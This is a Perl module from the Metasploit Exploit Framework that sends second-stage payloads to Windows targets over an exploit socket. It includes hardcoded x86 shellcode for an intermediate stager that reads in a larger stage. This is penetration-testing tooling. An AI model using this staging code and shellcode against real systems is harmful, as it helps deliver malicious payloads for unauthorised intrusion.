###############
##
#
#    Name: StagePayload.pm
# Version: $Revision$
# License:
#
#      This file is part of the Metasploit Exploit Framework
#      and is subject to the same licenses and copyrights as
#      the rest of this package.
#
# Descrip:
#
#      Base class for stager payload components that handles
#      the transmission of the stage payload.
#
##
###############

package Msf::PayloadComponent::Windows::StagePayload;
use strict;
use vars qw{@ISA};

#
# Import dependencies
#
sub _Import 
{
	my $class = shift;

	@ISA = ();

	foreach (@_) 
	{
		eval("use $_");
		unshift(@ISA, $_);
	}
}

#
# Returns the stage payload attribute of the information that was passed in
#
sub StagePayload 
{
	my $self = shift;

	return $self->_Info->{'StagePayload'};
}

#
# The prefix for the stage.  This is how tags are prefixed to the stage.
#
sub StagePrefix
{
	my $self = shift;
	my $prefix = @_ ? shift : undef;

	$self->{'_StagePrefix'} = $prefix if (defined($prefix));

	return $self->{'_StagePrefix'};
}

sub InlineStage
{
	my $self = shift;
	my $inline = @_ ? shift : undef;

	$self->{'_StageInline'} = $inline if (defined($inline));

	return $self->{'_StageInline'};
}

#
# Transmits the stage that we were handed such that it will be executed and
# all the lord's people will be happy
#
sub HandleConnection 
{
	my $self = shift;
	my $blocking;
	my $payload;
	my $sock;

	# Prepare yoself!
	$self->SUPER::HandleConnection;

	# If the multistage is transmitted outside of this context, do not transmit
	# it.  This was added in order to support things that have to transmit the
	# second stage out of band instead of over the actual exploit connection,
	# like PassiveX.
	return if ($self->InlineStage());

	# Build out the stage
	$sock     = $self->PipeRemoteOut;
	$payload  = $self->BuildPayload($self->StagePayload);
	$blocking = $sock->blocking;

	$sock->blocking(1);

	# If the stage has a prefix (such as a tag) use it.
	$payload = $self->StagePrefix . $payload if (defined($self->StagePrefix));

	# If the payload is over a certain threshold, use an intermediate stager
	$self->HandleIntermediateStage($sock, $payload);

	# Transmit the stage to the remote side
	$self->PrintLine('[*] Sending Stage (' . length($payload) . ' bytes)');

	eval { $sock->send($payload); };

	$self->PrintDebugLine(3, '[*] Stage Sent.');

	$sock->blocking($blocking);
}

#
# For windows, we check to see if the stage that is being sent is larger
# than a certain size.  If it is, we transmit another stager that will
# ensure that the entire stage is read in.
#
sub HandleIntermediateStage
{
	my $self = shift;
	my $sock = shift;
	my $payload = shift;
	
	return if length($payload) < 512;
	
	# The mid-stage works by reading in a four byte length in host-byte
	# order (which represents the length of the stage).  Following that, it
	# reads in the entire second stage until all bytes are read.
	my $midstager = 
		"\xfc\x31\xdb\x64\x8b\x43\x30\x8b\x40\x0c\x8b\x50\x1c\x8b\x12\x8b".
		"\x72\x20\xad\xad\x4e\x03\x06\x3d\x32\x33\x5f\x32\x75\xef\x8b\x6a".
		"\x08\x8b\x45\x3c\x8b\x4c\x05\x78\x8b\x4c\x0d\x1c\x01\xe9\x8b\x71".
		"\x3c\x01\xee\x55\x89\xe3\x6a\x00\x6a\x04\x53\x57\xff\xd6\x2b\x23".
		"\x66\x81\xe4\xfc\xff\x89\xe5\x55\x6a\x00\xff\x33\x55\x57\xff\xd6".
		"\x01\xc5\x29\x03\x85\xc0\x75\xf0\xc3";

	$self->PrintLine("[*] Sending Intermediate Stager (". length($midstager) ." bytes)");
	eval { $sock->send($midstager) };

	# Sleep to give enough time for the remote side to receive and read the
	# midstage so that we don't accidentally read in part of the second
	# stage.
	select(undef, undef, undef, 1.5);

	# The mid-stage requires that we transmit a four byte length field that
	# it will use as the length of the subsequent stage.		
	eval { $sock->send(pack("V", length($payload))) };
}

1;
